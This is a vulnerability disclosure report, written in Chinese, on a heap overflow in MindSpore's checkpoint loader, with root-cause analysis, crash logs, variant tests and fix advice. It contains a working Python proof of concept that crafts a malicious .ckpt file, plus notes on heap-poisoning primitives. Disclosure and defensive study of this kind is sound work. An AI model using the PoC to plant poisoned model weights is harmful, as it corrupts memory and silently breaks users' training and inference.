# MindSpore `load_checkpoint()` 堆缓冲区溢出（CWE-787）—— 上报材料

> **状态**：待上报（建议渠道：华为 PSIRT 优先，确认后再走 CVE / CNVD）
> **日期**：2026-08-07
> **上报人**：kaltsit-10（网名，独立上报；研究方向：具身智能软件基础设施漏洞挖掘）
> **附件**：`PoC/poc_heapoverflow.ckpt`（279B，Float32）、`PoC/int4_d2_c64.ckpt`（81B，Int4）、`PoC/tensor_py_master.cc`（master 源码，含漏洞函数）

---

## 一、漏洞概要

| 项 | 内容 |
|---|---|
| **漏洞类型** | CWE-787 越界写（堆缓冲区溢出） |
| **影响组件** | MindSpore（华为昇思，开源 AI 框架） |
| **漏洞入口** | `mindspore.load_checkpoint()` → `_load_into_param_dict` → `Tensor_.convert_bytes_to_tensor()`（C++ `ccsrc/pybind_api/ir/tensor_py.cc`） |
| **触发条件** | 加载恶意 `.ckpt` 文件：`tensor.dims` 声明很小，但 `tensor_content` 实际很大 |
| **影响版本** | **2.8.0、2.10.0（最新）、master 均受影响**（实测 + 源码确认） |
| **危害** | 内存破坏。PoC 稳定触发 glibc 堆破坏崩溃；理论上可升级为任意代码执行（堆风水，现代 glibc 下难度中高） |
| **CVSS 自评** | **7.1（High）**，向量 `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`（与 ncnn CVE-2026-50144 同模板）；以官方评估为准 |
| **攻击场景** | HuggingFace / ModelScope 投毒模型权重 → 用户 `load_checkpoint` → 崩溃 / 潜在 RCE |

---

## 二、漏洞描述

`.ckpt` 是 protobuf 格式。`TensorProto` 消息包含两个攻击者可控字段：

- `dims`（repeated int64）：声明张量形状
- `tensor_content`（bytes）：实际数据

Python 侧（`train/serialization.py:1268-1279`）**不做任何长度校验**，直接将两者传给 C++：

```python
data = element.tensor.tensor_content   # 攻击者控制
dims = element.tensor.dims             # 攻击者控制
...
param_data = Tensor_.convert_bytes_to_tensor(new_data, tuple(dims), ms_type)
```

C++ 侧 `ConvertBytesToTensor`（`tensor_py.cc:538-548`）**按攻击者的 dims 分配缓冲**，然后调用 `CopyFromBuffer` 把 content 拷进去：

```cpp
tensor::TensorPtr tensor = std::make_shared<tensor::Tensor>(data_type, shape);  // ← 按 dims 分配
...
CopyFromBuffer(tensor_data_buf, tensor->Size(), tensor_buf,
               PYBIND11_BYTES_SIZE(bytes_obj.ptr()), data_type);                // ← 拷贝
```

### 根因（`CopyFromBuffer`，`tensor_py.cc:504-537`）

`memcpy_s` 的第二个参数本应是 **dest 缓冲剩余大小**（用于安全检查），但代码传的是 `remain_size`（= src 剩余长度），**`dst_size` 参数在非 bf16 分支从未被读取**：

```cpp
size_t remain_size = src_size;             // 拷贝长度 = 攻击者控制的内容长度
...
auto ret = memcpy_s(dst_ptr, remain_size, src_ptr, remain_size);  // ★ 把 src 长度当 dest 缓冲大小
```

**结果**：当 `tensor_content` 长度 > dims 推导的期望大小（`tensor->Size()`）时，向过小缓冲写入超量数据 → **堆溢出**。安全函数 `memcpy_s` 因参数传错被完全绕过（它以为 dest 有 src_size 那么大）。

### 数据流

```
恶意 .ckpt → dims=[2], tensor_content=256B（攻击者控制）
  → shape=[2]
  → make_shared<Tensor>(Float32, [2])     // 分配 2*4 = 8 字节
  → CopyFromBuffer(dst=8B, dst_size=8, src=256B, src_size=256, Float32)
      → memcpy_s(dst, 256, src, 256)      // 写 256B 进 8B 缓冲 = 越界 248B
  → heap 元数据被破坏 → free() 时 glibc 检测 → 崩溃
```

---

## 三、复现步骤

### 环境

- WSL2 Ubuntu 22.04（x86_64）
- MindSpore 2.8.0 与 2.10.0（CPU 版，`pip install mindspore`）

### 构造恶意 `.ckpt`（PoC 已附）

```python
from mindspore.train.checkpoint_pb2 import Checkpoint

msg = Checkpoint()
v = msg.value.add()
v.tag = 'x'
v.tensor.tensor_type = 'Float32'
v.tensor.dims.extend([2])                    # 期望 2*4 = 8 字节
v.tensor.tensor_content = b'\x00\x00\x80\x3f' * 64   # 实际 256 字节 = 32 倍
open('poc_heapoverflow.ckpt', 'wb').write(msg.SerializeToString())
```

### 触发

```python
from mindspore import load_checkpoint
load_checkpoint('poc_heapoverflow.ckpt')
```

### 结果（2.8.0 与 2.10.0 输出一致）

```
RETURN-NORMALLY                          # load_checkpoint 本身返回成功！
free(): invalid next size (fast)         # glibc 在 tensor 析构时捕获堆破坏 → Aborted
```

**关键**：`load_checkpoint` 不报错直接返回，堆破坏在 Python 解释器关闭时暴露 → 崩溃发生在任何调用者代码之后，**调用方无法防御**。

### 复现证据汇总

| 版本 | 类型 | dims / 期望 | content | 结果 |
|------|------|------------|---------|------|
| 2.8.0 | Float32 | [2] / 8B | 256B | `free(): invalid next size (fast)` |
| 2.10.0 | Float32 | [2] / 8B | 256B | `free(): invalid next size (fast)` |
| 2.8.0 | Int4(qint4x2) | [2] / 1B | 64B | `free(): invalid next size (fast)` |
| 2.10.0 | Int4(qint4x2) | [2] / 1B | 64B | `free(): invalid next size (fast)` |
| 2.8.0 + `MALLOC_CHECK_=3` | Float32 | [2] / 8B | 256B | 同样 Aborted（glibc 加强检测确认） |

> Int4 变体证明漏洞**跨类型**——所有类型（含打包类型 qint4x2）都因同一根因受影响，非 Float32 特例。

### 边界测试（dims=[2] 期望 8B，改变内容长度）

| 内容长度 | 越界量 | 结果 |
|---------|-------|------|
| 8 B | 0 | ✅ 正常 |
| 12-24 B | 4-16 B | 静默（写入 heap 空隙，未触发检测） |
| **≥32 B** | **≥24 B** | 🔥 **稳定崩溃**（`free(): invalid next size` / SEGV） |

→ 越界写 ≥24 字节时稳定破坏 malloc chunk 元数据 → 崩溃必现。

### gdb 崩溃栈（下游症状）

```
Thread 1 "python" received signal SIGSEGV
0x... in _int_malloc (...)        ← 分配 36 字节都 SEGV
  → operator new → std::string 构造
  → mindspore::pipeline::ClearAttrAndMethodMap()
  → Py_FinalizeEx                  ← 解释器关闭时，malloc arena 已被越界写破坏
```

栈里没有 memcpy 写点，因为越界发生在更早的 `CopyFromBuffer`，崩溃只是 heap 元数据被破坏后的下游表现。

---

## 四、根因定位（源码铁证）

文件：`mindspore/ccsrc/pybind_api/ir/tensor_py.cc`（master 当前代码，附在 PoC/）

### `ConvertBytesToTensor`（538-548 行）

```cpp
TensorPtr TensorPy::ConvertBytesToTensor(const py::bytes &bytes_obj, const py::tuple &dims, const TypePtr &type_ptr) {
  ShapeVector shape;
  for (size_t i = 0; i < dims.size(); ++i) {
    shape.push_back(dims[i].cast<int>());
  }
  TypeId data_type = type_ptr ? type_ptr->type_id() : TypeId::kTypeUnknown;
  tensor::TensorPtr tensor = std::make_shared<tensor::Tensor>(data_type, shape);  // ← 按 dims 分配
  const char *tensor_buf = PYBIND11_BYTES_AS_STRING(bytes_obj.ptr());
  char *tensor_data_buf = reinterpret_cast<char *>(tensor->data_c());
  CopyFromBuffer(tensor_data_buf, tensor->Size(), tensor_buf,
                 PYBIND11_BYTES_SIZE(bytes_obj.ptr()), data_type);
  return tensor;
}
```

### `CopyFromBuffer`（504-537 行）—— 漏洞本体

```cpp
void CopyFromBuffer(char *dst, size_t dst_size, const char *src, size_t src_size, TypeId data_type) {
  bool fp16_in_fp32 = (data_type == TypeId::kNumberTypeBFloat16) && (dst_size * 2 == src_size);
  if (fp16_in_fp32) {
    // bf16 特判分支——【已验证有界安全】：写入总量恒等于 dst_size
    ...
  } else {
    size_t remain_size = src_size;             // ←★★★ 拷贝长度 = 内容长度（攻击者控制）
    auto dst_ptr = dst;
    auto src_ptr = src;
    while (remain_size > SECUREC_MEM_MAX_LEN) {
      auto ret = memcpy_s(dst_ptr, SECUREC_MEM_MAX_LEN, src_ptr, SECUREC_MEM_MAX_LEN);
      ...
      remain_size -= SECUREC_MEM_MAX_LEN;
      dst_ptr += SECUREC_MEM_MAX_LEN;
      src_ptr += SECUREC_MEM_MAX_LEN;
    }
    if (remain_size != 0U) {
      auto ret = memcpy_s(dst_ptr, remain_size, src_ptr, remain_size);  // ←★★★ 把 src 长度当 dest 缓冲大小
      ...
    }
  }
}
```

### 安全函数为什么被绕过

- `memcpy_s(dst, size, src, n)` 第二个参数是 dest 缓冲大小，用于安全检查
- 代码传入 `remain_size`（= src 剩余长度），**`dst_size` 在非 bf16 分支从未被读取**
- → `memcpy_s` 相信目标缓冲有 src_size 大，实际只有 dims 推导的大小
- → `src_size > dst_size` 时堆溢出，且 `memcpy_s` 不拦截

---

## 五、影响评估

### 严重性

- **内存破坏**（CWE-787），远超已知的内存放大 DoS（CWE-789）——同根因两种表现
- PoC 实现**可靠崩溃**（越界 ≥16B 覆盖相邻 chunk 头必现，0 字节缓冲写 ≥32B 即崩）
- `memcpy_s` 安全函数因参数传错被绕过，属于"安全函数误用"典型缺陷
- **RCE 可行性**（08-07 晚多视角评审）：完整 RCE 链 **UNLIKELY**（现代 glibc 2.35 safe-linking + 无内置泄漏原语 + 一次性单进程无 ASLR 爆破窗口 + 构造受控 fd 需堆基址的循环依赖）；但**攻击者字节进入 glibc 空闲链表**（fastbin fd 污染→_int_malloc 解引用 SIGSEGV）已实测，属 RCE 原语家族。**本漏洞作为可信内存破坏（Medium-High）上报，不虚高为 RCE，也不降级为仅 DoS**

### 攻击面

- 任何调用 `load_checkpoint` 加载 `.ckpt` 的用户
- 模型供应链投毒（HF / ModelScope 恶意模型权重 → 用户加载 → 崩溃/RCE）
- **具身智能场景**：模型权重加载是标准步骤，恶意权重可影响后续推理/控制流程

### 与已知 DoS 的关系（诚实声明）

| | 已知 DoS（CWE-789） | 本发现（CWE-787） |
|---|---|---|
| dims | 大（如 [1e5,1e5,1]） | 小（如 [2]） |
| content | 小（4B） | 大（256B） |
| 现象 | 尝试分配 40GB → OOM | 8B 缓冲写 256B → 堆破坏 |
| 触发点 | 分配阶段 | 拷贝阶段 |
| 影响 | DoS | **内存破坏（潜在 RCE）** |
| 公开状态 | **已公开**（HF PoC，声称已报厂商） | **未公开**（公开资料零提及） |

**结论**：已知 DoS 只覆盖"分配过大"一侧；**"拷贝不校验长度"这一侧（内存破坏）此前未公开**。修复应同时覆盖两点。

---

## 六、修复建议

1. **入口校验**（最小修复）：`ConvertBytesToTensor` 校验 `PYBIND11_BYTES_SIZE(bytes) == tensor->Size()`，不匹配直接抛异常
   - 参照同文件 `CopyData(shape, data, data_len)` 的 `size * sizeof(T) != data_len` 检查
2. **修 memcpy_s 参数**：`CopyFromBuffer` 的 `memcpy_s` 第二个参数应传 **dst 剩余大小**，而不是 src 剩余大小
3. **至少**：`dst_size` 参数必须被读取并作为上限（非 bf16 分支）
4. Python 侧（`_load_into_param_dict`）增加 `len(content) == prod(dims)*itemsize` 前置校验（纵深防御）

---

## 七、时间线建议

| 步骤 | 说明 |
|------|------|
| 1. 报华为 PSIRT | 官方渠道，附 PoC + 根因 + 修复建议 |
| 2. 等待厂商确认 | 确认是否"未修/新问题" |
| 3. 申请 CVE / CNVD | 厂商确认后走国际/国内编号 |
| 4. 公开 | 修复后发布 blog / 论文（可选） |

> ⚠️ 重要：DoS 已公开（HF PoC），CNVD 原创性核验会查重；**本堆溢出的原创价值在于"未公开的内存破坏表现"**。上报措辞应强调 CWE-787 与已知 DoS 的区分，而非重复 DoS 本身。

---

## 八、附件清单

| 文件 | 说明 |
|------|------|
| `PoC/poc_heapoverflow.ckpt` (279B) | Float32 触发文件：dims=[2] + 256B content |
| `PoC/int4_d2_c64.ckpt` (81B) | Int4 触发文件：dims=[2]（期望1B）+ 64B content，跨类型证明 |
| `PoC/tensor_py_master.cc` (48KB) | master 源码（含漏洞函数 CopyFromBuffer / ConvertBytesToTensor） |
| `craft_poc.py` | PoC 构造脚本 |
| `trigger.py` | 触发脚本（仅调用 load_checkpoint） |
| `screenshot_heapoverflow.png` | 实测崩溃截图（2026-08-09 真实 X 截图：`$ python trigger.py poc_heapoverflow.ckpt` → RETURN-NORMALLY → free(): invalid next size (fast)） |

---

## 九、变体审计与 RCE 评审补充（2026-08-07 晚）

### 9.1 类型无关性（588 case 矩阵：6 dtype × 14 dims × 7 长度，2.8.0 实测）

Float32 / Float16 / Int4(qint4x2) / Int8 / UInt8 / Bool **全部存在同款漏洞**（除一处 itemsize 差异外矩阵完全一致）。攻击者无需关心权重实际类型。

### 9.2 负值 dims 变体（新增攻击面）

- `cast<int>`（int64→int32）：超 int32 范围抛 RuntimeError 无回绕；**int32 范围内负值全部通过**
- 负/零/空 dims → `tensor->Size()=0` → 0 字节缓冲 → 任何 content 都是越界写
- 崩溃阈值 = 写字节数 > glibc chunk usable size（0 字节缓冲最小 chunk 24B）：写 ≤24B 静默、写 ≥32B 覆盖相邻 chunk header 崩
- **⭐ 独立缺陷：`parameter.py:308` 的 shape 校验只查 `-1 in self.shape`** → `dims=[-5]` 可让 `load_checkpoint` **静默正常返回畸形 Parameter**（shape=(-5,) 存活，asnumpy 抛 ValueError）。投毒 ckpt 可"加载成功"且堆已被越界写——比抛异常的 -1 变体更隐蔽

### 9.3 RCE 可行性多视角评审结论（Workflow：3 视角 + 综合 + 对抗验证）

- **实证**：多 value 布局 [正常 tensor, 溢出 tensor] → SIGSEGV@_int_malloc（遍历被 0x41 污染 fastbin fd）——**攻击者字节进入 glibc 空闲链表，fastbin 投毒原语成立**；溢出字节完全可控
- **评审**：堆利用 POSSIBLE / 对象布局 POSSIBLE / 威胁模型 LIKELY → 综合 POSSIBLE → **对抗验证修正为 UNLIKELY**（safe-linking 循环依赖：构造受控 fd 需堆基址，唯一泄漏源"重叠→asnumpy"本身需先有受控重叠）
- **结构洞察**：tensor 数据缓冲是叶子分配（地址低于 TensorImpl/TensorDataImpl），前向溢出只能破坏后分配 chunk 的 malloc 元数据，无法原位覆盖本 tensor 的 data 指针/shape/refcount/vtable
- **评级建议**：**Medium-High（可信内存破坏）**——真实、确定性、类型无关、崩溃可延迟到析构/后续 malloc、进程外远程触发、内存限制无法缓解；**不虚高为 POSSIBLE RCE，也不降级为仅 DoS**
- **同类漏洞对比**：PyTorch CVE-2026-24747（非可信 checkpoint 堆破坏，CVSS 3.1 8.8，仅 torch 2.10.0 修复）、TensorFlow CVE-2021-41221（模型输入堆溢出 7.8）、MindSpore 自家 CVE-2025-3144（3.3，上报需预判的反例——应强调供应链可达性 + 内存破坏侧未公开）

---

## 十、投毒 ckpt 穿过加载→推理→训练→保存全链路（2026-08-07 晚）

**场景实证**（2.8.0，Dense(2,2)，恶意 dims=[-5] 畸形 Parameter；subprocess 逐场景隔离）：

| 使用路径 | content=4B（纯畸形） | content=28B（越界 4B） |
|------|------|------|
| `load_param_into_net` 匹配 tag | RuntimeError（shape 不匹配，异常非崩溃） | — |
| 未匹配 tag + 推理 | **全正常**（畸形参数被静默跳过） | **业务全正常 + 进程退出 rc=-6** `free(): invalid next size (fast)` |
| 未匹配 tag + 训练 3 步 | **全正常**（loss 正常下降） | — |
| `save_checkpoint` | **静默丢数据**（见下） | — |
| 加载 + 8000 次 malloc | 全正常 | — |

**关键结论**：
1. **投毒在加载瞬间发生，与畸形参数后续是否被使用无关**——即使 load_param_into_net 跳过该参数（tag 不匹配），CopyFromBuffer 越界写已污染堆，业务看似正常、崩溃延迟到任意点（退出/后续释放）
2. **cb≥25B 档 = "业务成功 + 延迟崩溃"的隐蔽 DoS**：恶意 ckpt 被完整加载并正常产出推理/训练结果，堆已后台破坏，崩溃时机不可预测 → 排障困难、服务可能已输出错误结果，符合供应链投毒→延迟失效的现实画像
3. **save_checkpoint 对畸形参数 = 静默数据丢失（独立完整性缺陷）**：serialization.py `_write_parameter_bytes_data` 中 `get_bytes()` 对 0 字节 tensor 返回空串 → 序列化循环零次执行 → 空写、无异常。单参 dict 得 0 字节空文件；混合 dict 畸形参数被静默丢弃（正常参数保留）——受害者保存模型时权重静默丢失
4. 影响评估增强：漏洞不仅是"加载时崩溃"，而是**恶意 checkpoint 可静默进入生产训练/推理流程并造成延迟内存破坏 + 数据完整性破坏**
